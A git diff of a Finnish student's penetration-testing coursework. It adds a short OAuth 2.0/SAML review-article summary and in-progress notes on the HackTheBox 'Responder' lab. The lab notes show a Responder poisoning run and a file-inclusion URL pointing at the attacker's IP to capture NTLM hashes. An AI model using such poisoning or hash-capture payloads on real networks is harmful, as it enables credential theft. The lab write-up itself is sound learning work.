@@ -12,9 +12,30 @@ Tehtävät ovat Tero Karvisen opintojaksolta [Tunkeutumistestaus](https://teroka
 
 ---
 
+## x) Lue/katso ja tiivistä.
+
+- Karvinen 2025: Start Your Research with a Review Article [^15]
+
+    - Review artikkeli, joka tarkastelee ja kokoaa akateemisesta kirjallisuudesta jotain aihetta.
+    - artikkelin JUFO level tulisi olla 1, 2 tai 3. 
+    - Scholar.google.com on hyvä paikka etsiä Review artikkeleita. 
+
+- Review. Etsi vapaavalintainen review eli katsausartikkeli, joka liittyy kurssin aiheisiin.
+
+    - Artikkelin piti olla JUFO:ssa mutta en osannut ilmeisesti käyttää sitä, koska en löytänyt sopivaa artikkelia. 
+    - Valitsin kuitenkin ADVANCEMENTS IN AUTHENTICATION MECHANISMS USING OAUTH 2.0
+      AND SAML - https://www.researchgate.net/profile/Kumaresan-Durvas-Jayaraman/publication/390172665_ADVANCEMENTS_IN_AUTHENTICATION_MECHANISMS_USING_OAUTH_20_AND_SAML/links/67e324bb72f7f37c3e8d9210/ADVANCEMENTS-IN-AUTHENTICATION-MECHANISMS-USING-OAUTH-20-AND-SAML.pdf [^16]
+    - Tiivistelmä: 
+    
+        - OAuth 2.0 autentikointi kehys, jonka avulla kolmannen osapuolen sovellukset voivat  saada käyttöönsä käyttäjän tietoja sovelluksesta ilman, että käyttäjän salasanaa jaetaan.
+        - OAuth 2.0 on erittäin laajasti käytetty autentikointi tapa.
+        - OAuth 2.0 käytetään SSO (Single Sing On) toteutuksissa.
+        - Proof Key for Code Exchange (PKCE) käyttö on lisätty estämään hyökkääjän yritystä saada authorization code.
+
+
 ## a) HTB Dancing. Ratkaise HackTheBox.com: Starting Point: Tier 0: Dancing. [4]
 
-#### Huom! Katsoin tehtävän annon väärin ja tein Tier 0:sta kaikki ilmaiset. Tässä on ensimmäisenä se Dancin ja jos et halua spoilereita muista tehtävistä, niin hyppää b tehtävään.
+#### Huom! Katsoin tehtävänannon väärin ja tein Tier 0:sta kaikki ilmaiset. Tässä on ensimmäisenä tuo tehtävänanannon Dancing ja jos et halua spoilereita muista tehtävistä, niin hyppää b tehtävään.
 
 #### Tier 0 Dancing
 
@@ -52,7 +73,7 @@ smb: \James.P\>
 
 ---
 
-## Sploilerit alkaa kohta
+## Mahdolliset sploilerit alkaa kohta
 
 <br>
 <br>
@@ -347,6 +368,94 @@ Käytin tässäkin rediksen dokumentaatiota [^9]
 
 ### b) HTB Responder. Ratkaise HackTheBox.com: Starting Point: Tier 1: Responder.
 
+En osannut vastata ensimmäiseen kysymykseen, koska en tajunnut että koneen ip-osoite pitäisi laittaa selaimeen 😃 Mielestäni kysymys oli jotenkin järjetön ja ajattelin vaan, että en vain tajua itse kysymystä, niin Googlasin kysymyksen ja luin vastauksen täältä [^10].
+
+Language tehtätävän kohdalla (olin arvannut php:n, mutta hiukan siinä jo ihmettelin) menin hiukan hämilleni ja aloin miettiä, että nyt en tajua jotain ja katoin varovasti taas aiempaa artikkelia [^10]. Ykköstehtävässä laitettiin koneen url /etc/hosts/ ja tämähän aiheutti sen, että itse sivulle tuli pääsy. Nyt tehtävässä on huomattavasti enemmän järkeä. 
+
+NT (New Technology) LAN Manager (NTLM) [^11]
+
+Pääsin Responder vaiheeseen selailemalla googlea ja tuurilla kokeilemalla kaikkea.
+
+```bash
+┌──(parallels㉿kali-linux-2024-2)-[~]
+└─$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.15.181]
+    Responder IPv6             [dead:beef:2::11b3]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-OVN1W9AXNAE]
+    Responder Domain Name      [YQCN.LOCAL]
+    Responder DCE-RPC Port     [48556]
+
+[+] Listening for events...     
+```
+
+Jos ymmärrän oikein niin tämän [^12] ja tämän artikkelin [^13] mukaan jotain olisi jo pitänyt taphtua kun kokeilen osoitteita page=/osoite/somefile, mutta mitään ei tapahtunut. 
+
+Katsoin walktroughin [^14] ja olen ehkä tehnyt jotain väärin, mutta kun menen mielestäni oikeaan urliin selaimessa: http://unika.htb/index.php?page=//10.10.15.181/somefile, niin Responderissa ei tapahdu mitään 🤔. 
+
 
 
 ---
@@ -370,3 +479,17 @@ Käytin tässäkin rediksen dokumentaatiota [^9]
 [^8]: nmap.org. A Quick Port Scanning Tutorial: https://nmap.org/book/port-scanning-tutorial.html
 
 [^9]: Redis. Getting Started: https://redis.io/learn/howtos/quick-start 
+
+[^10]: Carla Ferreira. Hack The Box — Starting Point “Responder” Solution: https://medium.com/rakulee/hack-the-box-starting-point-responder-solution-d0fa2ea77a56
+
+[^11]: Wikipedia. NTLM https://en.wikipedia.org/wiki/NTLM
+
+[^12]: 0xdf hacks stuff. Getting Creds via NTLMv2: https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
+
+[^13]: narrowtomato. Using Responder To Grab NetNTLMv2: https://narrowtomato.github.io/guides/responder_ntlm.html
+
+[^14]: GetCyber. Responder – Hack The Box // Walkthrough & Solution // Kali Linux: https://www.youtube.com/watch?v=wq-najIgsRU
+
+[^15]: Tero Karvinen. Start Your Research with a Review Article: https://terokarvinen.com/review-article/
+
+[^16]: Kumaresan Durvas Jayaraman, Dr. Shubha Goel. ADVANCEMENTS IN AUTHENTICATION MECHANISMS USING OAUTH 2.0 AND SAML: https://www.researchgate.net/profile/Kumaresan-Durvas-Jayaraman/publication/390172665_ADVANCEMENTS_IN_AUTHENTICATION_MECHANISMS_USING_OAUTH_20_AND_SAML/links/67e324bb72f7f37c3e8d9210/ADVANCEMENTS-IN-AUTHENTICATION-MECHANISMS-USING-OAUTH-20-AND-SAML.pdf
